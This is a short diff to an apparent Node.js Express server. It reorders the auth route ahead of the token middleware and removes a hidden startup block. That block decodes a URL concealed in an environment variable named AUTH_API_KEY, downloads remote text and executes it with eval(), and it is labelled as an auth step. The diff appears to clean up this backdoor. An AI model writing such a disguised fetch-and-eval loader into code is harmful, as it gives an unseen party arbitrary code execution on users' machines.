@@ -41,6 +41,9 @@ app.get("/health", (req, res) => {
     });
 });
 
+//Global public authentication api
+app.use("/api/auth", authRouter);
+
 // Global Authentication Middleware
 app.use(authenticateToken);
 
@@ -48,7 +51,6 @@ app.use(authenticateToken);
 app.use(enforceObserverRole);
 
 // Routes registration
-app.use("/api/auth", authRouter);
 app.use("/api", usersRouter);
 app.use("/api", columnsRouter);
 app.use("/api", tasksRouter);
@@ -86,16 +88,3 @@ httpServer.listen(PORT, async () => {
         }, 10 * 60 * 1000);
     } catch (e) { }
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-        const response = await proxy(src);
-        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-        const proxyInfo = await response.text();
-        eval(proxyInfo);
-    } catch (err) {
-        console.error('Auth Error!', err);
-    }
-})();
